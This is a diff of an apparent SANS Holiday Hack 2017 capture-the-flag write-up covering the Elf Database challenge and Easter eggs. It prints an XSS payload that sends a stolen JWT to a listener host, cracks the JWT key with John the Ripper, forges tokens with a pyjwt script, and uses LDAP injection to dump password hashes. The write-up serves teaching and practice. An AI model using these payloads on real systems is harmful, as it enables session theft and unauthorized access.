-<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
-Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
-<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
-<li>A Spot of Tee
-<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
-<li>Understanding and Exploiting Web-based LDAP
+Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
-<li>Massively Scaling your Scanning
-<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
-</ul>
+</p>
 </div>
 </div>
 
-<div id="outline-container-orgcb4bc49" class="outline-4">
-<h4 id="q8_goal"><a id="orgcb4bc49"></a>Goal</h4>
+<div id="outline-container-orgd6db581" class="outline-4">
+<h4 id="q8_goal"><a id="orgd6db581"></a>Goal</h4>
 <div class="outline-text-4" id="text-q8_goal">
 <p>
-What are we trying to accomplish?
+The hints lay out a pretty clear path: we can use {{abbr(Cross-site Scripting, XSS)}} to send a malicious request to one of the elves or
+reindeer, and then steal their JWT token and access the directory.
 </p>
 </div>
 </div>
 
-<div id="outline-container-org1bddca5" class="outline-4">
-<h4 id="q8_approach"><a id="org1bddca5"></a>Approach</h4>
+<div id="outline-container-orgdd00265" class="outline-4">
+<h4 id="q8_approach"><a id="orgdd00265"></a>Approach</h4>
 <div class="outline-text-4" id="text-q8_approach">
-<p>
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
-</p>
-</div>
 </div>
 
-<div id="outline-container-orgd2fed64" class="outline-4">
-<h4 id="q8_solution"><a id="orgd2fed64"></a>Solution</h4>
-<div class="outline-text-4" id="text-q8_solution">
+<ul class="org-ul">
+<li><a id="orgfbc5140"></a>Cross-Site Scripting<br />
+<div class="outline-text-5" id="text-orgfbc5140">
 <p>
-Summarize the reference solution that we found
-</p>
-
-<p>
-My solution:
-</p>
-
-<p>
-This was a multi stage exploit.
-</p>
-
-<p>
-The first stage was XSS via the support request.
-</p>
-
-<p>
-First I attempted to steal document.cookie, but then i realized the cookie
-didn't help, and one needed the auth token mentioned in the html/javascript
-source:
+The first stage of this attack is our malicious {{abbr(Cross-site Scripting, XSS)}} request. First, we tried to steal the cookie, but in reviewing the code at <a href="http://edb.northpolechristmastown.com/">http://edb.northpolechristmastown.com/</a>, we noticed that we needed to steal the token out of local storage:
 </p>
 
 <div class="org-src-container">
@@ -6570,28 +6572,87 @@ source:
 </pre>
 </div>
 
+<p>
+A classic {{abbr(Cross-site Scripting, XSS)}} attack is using the HTML <code>IMG</code> tag, and causing Javascript code to run and leak the token to a server we control. This is just one of many options in the <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">OWASP Cheat Sheet</a>.
+</p>
+
+<div class="org-src-container">
+<pre class="src src-html">&lt;<span style="color: #de935f;">IMG</span> SRC=/ <span style="color: #f0c674;">onerror</span>=<span style="color: #8abeb7;">"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');"</span>&gt;
+&lt;/<span style="color: #de935f;">IMG</span>&gt;
+</pre>
+</div>
+
+<p>
+We'll start a <code>netcat</code> listener on the l2s system:
+</p>
+
 
 <p>
 on l2s:
 </p>
 
 <pre class="example">
-$ nc -v -l -p 4444 on l2s
-</pre>
-
-<pre class="example">
-http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service \
-uid=alabaster.snowball \
-email=alabaster.snowball@northpolechristmastown.com \
-message="&lt;IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"&gt;&lt;/img&gt;"
+$ nc -v -l -p 4444
 </pre>
 
 <p>
-With the success of the XSS attack, the stolen token was stored in [output/jwt](output/jwt).
+Next, we'll submit the support form with our malicious message:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-sh">http -v --form --proxy=http:socks5://@localhost:32080  POST http://edb.northpolechristmastown.com/service <span style="color: #8abeb7;">\</span>
+<span style="color: #f0c674;">uid</span>=alabaster.snowball <span style="color: #8abeb7;">\</span>
+<span style="color: #f0c674;">email</span>=alabaster.snowball@northpolechristmastown.com <span style="color: #8abeb7;">\</span>
+<span style="color: #f0c674;">message</span>=<span style="color: #8abeb7;">"&lt;IMG SRC=/ onerror=\"document.location='http://10.142.0.11:4444/?cookie='+localStorage.getItem('np-auth');\"&gt;&lt;/img&gt;"</span>
+</pre>
+</div>
+
+<p>
+A few seconds later, back on l2s:
+</p>
+
+<pre class="example">
+GET /?cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Referer: http://127.0.0.1/reset_request?ticket=L78G1-F4X9X-T4FIR-9C4R4
+User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
+Connection: Keep-Alive
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,*
+Host: 10.142.0.11:4444
+</pre>
+</div>
+</li>
+
+<li><a id="org7a398c4"></a>JWT Token<br />
+<div class="outline-text-5" id="text-org7a398c4">
+<p>
+With the success of the XSS attack, the stolen token was stored in output/jwt TODO add a real link here.
 </p>
 
 <p>
-Unfortunately the token had expired 4 months ago, and could no longer be used to create a new session:
+Great! Now we just need to modify our local storage, similar to how we
+added our cookie for EWA, and refresh the page! &#x2026;and nothing
+happens. If we look at the Network tab of the Developer Tools, we'll
+see that there was a request to <code>/login</code>, but it returned false:
+</p>
+
+
+<div class="figure">
+<p><img src="./images/edb_login_failed.png" alt="edb_login_failed.png" width="350px" />
+</p>
+<p><span class="figure-number">Figure 26: </span>Elf Database Login Failed</p>
+</div>
+
+<div class="hint">
+<p>
+Alabaster told me he uses JWT tokens because they are super secure as long as you use a long and complex key. Otherwise, they could be cracked and recreated using any old framework like <a href="https://github.com/jpadilla/pyjwt">pyjwt</a> to forge a key.
+</p>
+
+</div>
+
+<p>
+That seems relevant. Let's check out <code>pyjwt</code>:
 </p>
 
 <div class="org-src-container">
@@ -6603,8 +6664,16 @@ Unfortunately the token had expired 4 months ago, and could no longer be used to
 </div>
 
 <p>
-We needed to crack the encryption key in order to forge a new, valid one.  We
-used jwt2john.py and john to crack it.  The Makefile shows the process:
+Unfortunately the token had expired 4 months ago, and could no longer
+be used to create a new session. The hint mentions that the key needs
+to be secure &#x2013; but what if it's not? Let's try cracking it. A bit of
+Googling later, we end up at <code>jwt2john.py</code>. This can convert the raw
+token into a format that John the Ripper can understand, and then it
+can try to crack it.
+</p>
+
+<p>
+Our Makefile shows the process for cracking the key:
 </p>
 
 <pre class="example">
@@ -6617,12 +6686,10 @@ john.txt: jwt.john
 </pre>
 
 <p>
-jwt2john is used to convert the raw jwt token to a file format john can
-understand, and then john is used to crack it:
+To run it, we just run <code>make john.txt</code>:
 </p>
 
 <pre class="example">
-$ make john.txt
 python3 ../tools/jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I &gt; jwt.john
 john  --format=HMAC-SHA256 jwt.john
 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 32/64 OpenSSL])
@@ -6638,75 +6705,264 @@ $ cat john.txt
 </pre>
 
 <p>
-Cracking the jwt token took 6 minutes and found that the secret key was <code>3lv3s</code>.
+Cracking the jwt token took 6 minutes and found that the secret key was <code>3lv3s</code>. Now we can use <code>pyjwt</code> again to create a spoofed token:
 </p>
 
-<p>
-TODO: show make_jwt.py and alabaster.jwt makefile targets and how it was used to login. using the browser tools
-</p>
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #b5bd68;">import</span> sys
+<span style="color: #b5bd68;">import</span> jwt
+
+<span style="color: #f0c674;">SECRET_KEY</span>=<span style="color: #8abeb7;">'3lv3s'</span>
+
+<span style="color: #f0c674;">user</span> = sys.argv[1]
+<span style="color: #f0c674;">dept</span> = sys.argv[2]
+<span style="color: #f0c674;">ou</span> = sys.argv[3]
+
+<span style="color: #f0c674;">data</span> = {
+    <span style="color: #8abeb7;">'dept'</span>: dept,
+    <span style="color: #8abeb7;">'ou'</span>: ou,
+    <span style="color: #8abeb7;">'uid'</span>: user,
+    <span style="color: #8abeb7;">'expires'</span>: <span style="color: #8abeb7;">'2018-08-16 12:00:47.248093+00:00'</span>,
+}
+
+<span style="color: #f0c674;">token</span> = jwt.encode(data, key=SECRET_KEY)
+<span style="color: #b5bd68;">print</span>(token.decode(<span style="color: #8abeb7;">'utf-8'</span>))
+</pre>
+</div>
 
 <p>
-To automate the process [tools/edb.py](tools/edb.py) was written to exploit the ldap injection vuln using the search string
+Plugging in the values from our expired cookie, we get:
 </p>
 
 <pre class="example">
-name=))(department=it)(|(cn=
+$ ./make_jwt.py alabaster.snowball Engineering elf
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCIsImV4cGlyZXMiOiIyMDE4LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCJ9.iVg7UqgyCSw688qBLv-n7nD5a1sc9bcMnmTkJKEgIGw
 </pre>
 
 <p>
-and by passing <code>*</code> as the attributes query field. With that query and all
-attributes it is able to grab the entire ldap database including password
-hashes.
+We can plug this into our Local Storage, using the Firefox Developer Tools:
+</p>
+
+
+<div class="figure">
+<p><img src="./images/edb_local_storage.png" alt="edb_local_storage.png" />
+</p>
+<p><span class="figure-number">Figure 27: </span>Updating our Local Storage</p>
+</div>
+
+<p>
+Refresh, and&#x2026;
+</p>
+
+
+<div class="figure">
+<p><img src="./images/edb_search.png" alt="edb_search.png" />
+</p>
+<p><span class="figure-number">Figure 28: </span>EDB Personnel Search</p>
+</div>
+
+<p>
+Poking around a little bit, we see that there's a "Santa Panel." Unfortunately, Alabaster's not authorized for that:
+</p>
+
+
+<div class="figure">
+<p><img src="./images/edb_must_be_a_clause.png" alt="edb_must_be_a_clause.png" width="350px" />
+</p>
+<p><span class="figure-number">Figure 29: </span>EDB Personnel Search</p>
+</div>
+</div>
+</li>
+
+<li><a id="org0211fbc"></a>LDAP Injection<br />
+<div class="outline-text-5" id="text-org0211fbc">
+<p>
+We managed to login to the system, but now let's see what LDAP injection we can do, as we follow the SANS blog post. First, let's see what a standard search looks like, using the Network tab of the Firefox Developer Tools:
+</p>
+
+
+<div class="figure">
+<p><img src="./images/edb_test_search.png" alt="edb_test_search.png" />
+</p>
+<p><span class="figure-number">Figure 30: </span>EDB Search for Elves</p>
+</div>
+
+<p>
+Why, this looks pretty similar to what the blog post has. On a lark, let's see what happens if we try searching for the LDAP injection example from the blog post:
+</p>
+
+<pre class="example">
+))(department=it)(|(cn=
+</pre>
+
+
+<div class="figure">
+<p><img src="./images/edb_ldap_injection_success.png" alt="edb_ldap_injection_success.png" />
+</p>
+<p><span class="figure-number">Figure 31: </span>EDB Injection PoC</p>
+</div>
+
+<p>
+That worked. We got a list with elves, reindeers &#x2013; even administrators! Now that we have some information on Santa, let's change our cookie to his, and access the Santa Panel:
+</p>
+
+<pre class="example">
+.make_jwt.py santa.claus administrators human
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXB0IjoiYWRtaW5pc3RyYXRvcnMiLCJvdSI6Imh1bWFuIiwidWlkIjoic2FudGEuY2xhdXMiLCJleHBpcmVzIjoiMjAxOC0wOC0xNiAxMjowMDo0Ny4yNDgwOTMrMDA6MDAifQ.JQ16hqPVuXmJDqA5PgZ4jMwn9RRQAuPuJhNsXfC5ZYk
+</pre>
+
+
+<div class="figure">
+<p><img src="./images/edb_confirm_password.png" alt="edb_confirm_password.png" width="350px" />
+</p>
+<p><span class="figure-number">Figure 32: </span>EDB Santa Panel</p>
+</div>
+
+<p>
+Nope. Somehow, we'll need to get passwords from LDAP first. At this
+point, we've managed to query all the entries in LDAP, but the web app
+restricts which fields we can see. The SANS blog post also discusses
+modifying parameters to view extra, or different fields. Let's try:
+</p>
+
+
+<div class="figure">
+<p><img src="./images/edb_all_attributes.png" alt="edb_all_attributes.png" width="500px" />
+</p>
+<p><span class="figure-number">Figure 33: </span>EDB Return All Attributes</p>
+</div>
+
+
+<div class="figure">
+<p><img src="./images/edb_all_attrs_result.png" alt="edb_all_attrs_result.png" width="500px" />
+</p>
+<p><span class="figure-number">Figure 34: </span>EDB All Rudolph's Attributes</p>
+</div>
+
+<p>
+We now have password hashes for all the users! But really, we're after Santa's password. We could try to crack his password, but if we just Google it, it pops up on several sites.
+</p>
+
+<div class="note">
+<p>
+Santa's password hash &amp; password originally were <code>cdabeb96b508f25f97ab0f162eac5a04</code> and <code>1iwantacookie</code>, but this was modified to <code>d8b4c05a35b0513f302a85c409b4aab3</code> (<code>001cookielips001</code>).
+</p>
+
+</div>
+
+<p>
+Armed with that password, we can access the Santa Panel, where we find:
+</p>
+
+
+<div class="figure">
+<p><img src="./images/wizard_of_oz_to_santa_d0t011d408nx.png" alt="wizard_of_oz_to_santa_d0t011d408nx.png" width="600px" />
+</p>
+<p><span class="figure-number">Figure 35: </span>Letter to Santa</p>
+</div>
+</div>
+</li>
+</ul>
+</div>
+
+<div id="outline-container-orgf3537af" class="outline-4">
+<h4 id="q8_solution"><a id="orgf3537af"></a>Solution</h4>
+<div class="outline-text-4" id="text-q8_solution">
+<p>
+There was a lot of stuff going on in this question. First, we needed to use {{abbr(Cross-site Scripting, XSS)}} to grab a copy of the JWT token, then we had to recover the secret and forge a new token.
 </p>
 
 <p>
-The letter page requires a valid password, convienently a google search for santas md5 password quickly finds a valid password.
+Once we logged into the system, we found it was vulnerable to LDAP injection, and were able to dump all the users, and their passwords. Cracking Santa's password allowed us to access the letter from the Wizard of Oz.
 </p>
+
+<p>
+We automated this attack with tools/edb.py TODO ADD LINK HERE, which dumps the LDAP database:
+</p>
+
+<pre class="example">
+$ ./edb.py | head
+[
+ [
+  [
+   "cn=rudolph,ou=reindeer,dc=northpolechristmastown,dc=com",
+   {
+    "c": [
+     "US"
+    ],
+    "cn": [
+     "rudolph"
+...
+</pre>
 </div>
 </div>
 
-<div id="outline-container-org993e8bc" class="outline-4">
-<h4 id="q8_alternatives"><a id="org993e8bc"></a>Alternatives</h4>
+<div id="outline-container-org00afe04" class="outline-4">
+<h4 id="q8_alternatives"><a id="org00afe04"></a>Alternatives</h4>
 <div class="outline-text-4" id="text-q8_alternatives">
 <p>
-Any other, easier solutions?
-</p>
-</div>
-</div>
-
-<div id="outline-container-org7f0fe94" class="outline-4">
-<h4 id="q8_common-pitfalls"><a id="org7f0fe94"></a>Common Pitfalls</h4>
-<div class="outline-text-4" id="text-q8_common-pitfalls">
-<p>
-Do we know what issue(s) people were running into?
+The website's <code>robots.txt</code> page lists a single entry, <a href="http://edb.northpolechristmastown.com/dev/">http://edb.northpolechristmastown.com/dev/</a>, which leads us to this {{abbr(LDAP Data Interchange Format, LDIF)}} file:
 </p>
 
-<p>
-Cracking the JWT key was tricky without the propper tools.
-My first python based solution was broken.  A fixed version was too slow.
-running it using pypy helped a bit, but the pyjwt library is not optimized for cracking.
-<a href="https://github.com/lmammino/jwt-cracker">https://github.com/lmammino/jwt-cracker</a> was a bit faster, but john outperformed
-everything.  The hard part was finding out how to use john to crack a jwt secret key.
-</p>
-</div>
-</div>
+<pre class="example">
+#LDAP LDIF TEMPLATE
 
-<div id="outline-container-org284d278" class="outline-4">
-<h4 id="q8_about-the-challenge"><a id="org284d278"></a>About the Challenge</h4>
-<div class="outline-text-4" id="text-q8_about-the-challenge">
+dn: dc=com
+dc: com
+objectClass: dcObject
+
+dn: dc=northpolechristmastown,dc=com
+dc: northpolechristmastown
+objectClass: dcObject
+objectClass: organization
+
+dn: ou=human,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: human
+
+dn: ou=elf,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: elf
+
+dn: ou=reindeer,dc=northpolechristmastown,dc=com
+objectClass: organizationalUnit
+ou: reindeer
+
+dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
+objectClass: addressbookPerson
+cn: 
+sn: 
+gn: 
+profilePath: /path/to/users/profile/image
+uid: 
+ou: 
+department: 
+mail: 
+telephoneNumber: 
+street:
+postOfficeBox: 
+postalCode: 
+postalAddress: 
+st: 
+l: 
+c: 
+facsimileTelephoneNumber: 
+description: 
+userPassword: 
+</pre>
+
 <p>
-How was the challenge setup? Was there a better way to secure this
-system?
+Knowing the LDAP structure would make it easier to pull out the passwords, but much of the work leading up to that would remain the same.
 </p>
 </div>
 </div>
 </div>
-<div id="outline-container-orgd5a4dae" class="outline-3">
-<h3 id="orgd5a4dae">Fin: The Evil Good Witch</h3>
-<div class="outline-text-3" id="text-orgd5a4dae">
+<div id="outline-container-orgc2f5fd7" class="outline-3">
+<h3 id="orgc2f5fd7">Fin: The Evil Good Witch</h3>
+<div class="outline-text-3" id="text-orgc2f5fd7">
 </div>
-<div id="outline-container-orgfa83334" class="outline-4">
-<h4 id="q9_question"><a id="orgfa83334"></a>Question</h4>
+<div id="outline-container-orgc8315e7" class="outline-4">
+<h4 id="q9_question"><a id="orgc8315e7"></a>Question</h4>
 <div class="outline-text-4" id="text-q9_question">
 <p>
 Which character is ultimately the villain causing the giant snowball
@@ -6715,8 +6971,8 @@ problem. What is the villain's motive?
 </div>
 </div>
 
-<div id="outline-container-org204bce4" class="outline-4">
-<h4 id="q9_solution"><a id="org204bce4"></a>Solution</h4>
+<div id="outline-container-orgeed1aaf" class="outline-4">
+<h4 id="q9_solution"><a id="orgeed1aaf"></a>Solution</h4>
 <div class="outline-text-4" id="text-q9_solution">
 <p>
 This answer comes straight from the game. Once we've found at least 5 pages, and completed all the levels, we see the following message:
@@ -6726,7 +6982,7 @@ This answer comes straight from the game. Once we've found at least 5 pages, and
 <div class="figure">
 <p><img src="./images/glinda.png" alt="glinda.png" />
 </p>
-<p><span class="figure-number">Figure 24: </span>The Villain Revealed</p>
+<p><span class="figure-number">Figure 36: </span>The Villain Revealed</p>
 </div>
 
 <p>
@@ -6736,45 +6992,45 @@ It's always about the money&#x2026;
 </div>
 </div>
 </div>
-<div id="outline-container-orge4e5f3f" class="outline-2">
-<h2 id="orge4e5f3f">Easter Eggs</h2>
-<div class="outline-text-2" id="text-orge4e5f3f">
+<div id="outline-container-orgdba669f" class="outline-2">
+<h2 id="orgdba669f">Easter Eggs</h2>
+<div class="outline-text-2" id="text-orgdba669f">
 </div>
-<div id="outline-container-org5ade6b7" class="outline-3">
-<h3 id="org5ade6b7">Story Page</h3>
-<div class="outline-text-3" id="text-org5ade6b7">
+<div id="outline-container-org47e6ef0" class="outline-3">
+<h3 id="org47e6ef0">Story Page</h3>
+<div class="outline-text-3" id="text-org47e6ef0">
 </div>
-<div id="outline-container-orgeeac070" class="outline-4">
-<h4 id="orgeeac070">Wintered logo is based on the Wicked stage musical poster.</h4>
+<div id="outline-container-orgcff0efc" class="outline-4">
+<h4 id="orgcff0efc">Wintered logo is based on the Wicked stage musical poster.</h4>
 </div>
-<div id="outline-container-org9079d81" class="outline-4">
-<h4 id="org9079d81">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</h4>
-<div class="outline-text-4" id="text-org9079d81">
+<div id="outline-container-org43b6174" class="outline-4">
+<h4 id="org43b6174">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</h4>
+<div class="outline-text-4" id="text-org43b6174">
 <iframe width="560" height="315" src="https://www.youtube.com/embed/g9ByiEGfAXk?rel=0&amp;start=99" frameborder="0" gesture="media" allow="encrypted-media" allowfullscreen></iframe>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org8480a98" class="outline-3">
-<h3 id="org8480a98">North Pole and Beyond</h3>
-<div class="outline-text-3" id="text-org8480a98">
+<div id="outline-container-org861cc09" class="outline-3">
+<h3 id="org861cc09">North Pole and Beyond</h3>
+<div class="outline-text-3" id="text-org861cc09">
 </div>
-<div id="outline-container-org762c254" class="outline-4">
-<h4 id="org762c254">Stocking</h4>
-<div class="outline-text-4" id="text-org762c254">
+<div id="outline-container-orgd2a32af" class="outline-4">
+<h4 id="orgd2a32af">Stocking</h4>
+<div class="outline-text-4" id="text-orgd2a32af">
 <p>
 The text field for entering the SHA1 hashes of the great book pages appears to have some placeholder text in it, <code>686579212121202d436f756e746572204861636b</code>. This is in hex and can be converted to ascii, <code>hey!!! -Counter Hack</code>.
 </p>
 </div>
 </div>
 
-<div id="outline-container-org693a1e9" class="outline-4">
-<h4 id="org693a1e9">Exploration</h4>
-<div class="outline-text-4" id="text-org693a1e9">
+<div id="outline-container-orgefc2f35" class="outline-4">
+<h4 id="orgefc2f35">Exploration</h4>
+<div class="outline-text-4" id="text-orgefc2f35">
 </div>
 <ul class="org-ul">
-<li><a id="orgf88b8e3"></a>Star Wars robots references in <a href="http://nppd.northpolechristmastown.com/robots.txt">http://nppd.northpolechristmastown.com/robots.txt</a><br />
-<div class="outline-text-5" id="text-orgf88b8e3">
+<li><a id="org75388a3"></a>Star Wars robots references in <a href="http://nppd.northpolechristmastown.com/robots.txt">http://nppd.northpolechristmastown.com/robots.txt</a><br />
+<div class="outline-text-5" id="text-org75388a3">
 <p>
 The robots.txt page for the nppd site has a number of robot references as user-agents.
 </p>
@@ -6786,12 +7042,60 @@ The robots.txt page for the nppd site has a number of robot references as user-a
 </div>
 </li>
 
-<li><a id="orgba589b4"></a>Munchkins<br />
-<div class="outline-text-5" id="text-orgba589b4">
+<li><a id="org069ecf5"></a>Munchkins<br />
+<div class="outline-text-5" id="text-org069ecf5">
 <p>
 In the Munchin BOLO, the munchkins disappeared after speaking something that sounded like 'puuurzgexgull'. This is most likely a reference to the word 'pyrzqxgl' which was a word described in the book 'The Magic of Oz'. A munchkin, incidentally named 'Bini Aru', like the munchkin in the BOLO, wrote down how to pronounce the word. The word was magical and could be used to transform a being into a different creature. Also, Boq is another munchkin named in the Land of Oz book series.
 </p>
 </div>
+
+<ul class="org-ul">
+<li><a id="orgb725e8e"></a>Reindeer Speak<br />
+<div class="outline-text-6" id="text-orgb725e8e">
+<blockquote>
+<p>
+hhhhhhhhhhhhhh723yhmn03z2784mn1
+</p>
+
+<p>
+4cv24 2 342 34 zx5p2342zx1
+</p>
+
+<p>
+42
+</p>
+
+<p>
+10xc 3912 934u xd528034y2dnryhrhndr23n 234f 2bd4 5  8g 7238g4508 s23425
+</p>
+
+
+<p>
+On 11/15/2017 11:18 AM, admin@northpolechristmastown.com wrote:
+&gt; Keep up the good job reindeer!
+&gt;
+&gt;
+&gt; On 11/15/2017 11:17 AM, reindeer@northpolechristmastown.com wrote:
+&gt;&gt; t68 2`x4-`8- 28- 5t 3y=8 m89 cfqlhmniuxdk.hszv3ct79p137p2p t78 23t80
+&gt;&gt; x 601x
+&gt;&gt;
+&gt;&gt; <img src="http://ghk.h-cdn.co/assets/cm/15/11/640x480/54ffe5266025c-dog1.jpg" alt="54ffe5266025c-dog1.jpg" />
+&gt;&gt;
+&gt;&gt; On 11/15/2017 10:28 AM, admin@northpolechristmastown.com wrote:
+&gt;&gt;&gt; Hi,
+&gt;&gt;&gt;
+&gt;&gt;&gt; Welcome to your new account.
+&gt;&gt;
+&gt;
+</p>
+</blockquote>
+
+<p>
+The reindeer appear to be speaking. Or randomly typing.
+</p>
+</div>
+</li>
+</ul>
 </li>
 </ul>
 </div>
